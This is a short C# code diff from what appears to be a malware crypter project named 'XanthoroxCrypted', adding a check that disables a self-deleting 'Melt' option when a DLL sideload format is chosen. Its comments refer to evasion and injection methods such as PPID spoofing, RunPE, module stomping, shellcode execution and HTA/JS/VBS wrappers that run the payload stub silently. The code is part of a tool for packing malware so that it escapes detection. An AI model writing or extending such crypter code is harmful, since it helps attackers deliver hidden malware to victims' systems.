@@ -130,6 +130,25 @@ namespace XanthoroxCrypted.Core
             // modifies the parent. Both are compatible — PPID applies to the crypter
             // process, PhantomDLL executes the payload in DLL memory.
 
+            // ═══ 11. SIDELOAD FORMAT CONFLICTS ═══
+            // CPL/XLL/MSI are DLL formats — RunPE creates a new process, so it works
+            // from a DLL. But Fibers/CallbackProxy/ModuleStomp are in-process shellcode
+            // execution — they work differently inside a DLL host process.
+            if (config.SideloadFormat && config.SideloadFormatType >= 1 && config.SideloadFormatType <= 3)
+            {
+                // DLL sideload: Melt doesn't make sense (can't delete the DLL while loaded)
+                if (config.Melt)
+                {
+                    config.Melt = false;
+                    result.AutoFixed = true;
+                    result.Warnings.Add("Sideload DLL + Melt conflict — disabled Melt (can't delete a loaded DLL).");
+                }
+            }
+
+            // ═══ 12. SIDELOAD SCRIPT FORMATS ═══
+            // HTA/JS/VBS launch the EXE stub — they work with any execution method.
+            // The script wrapper just executes the stub silently.
+
             return result;
         }
 
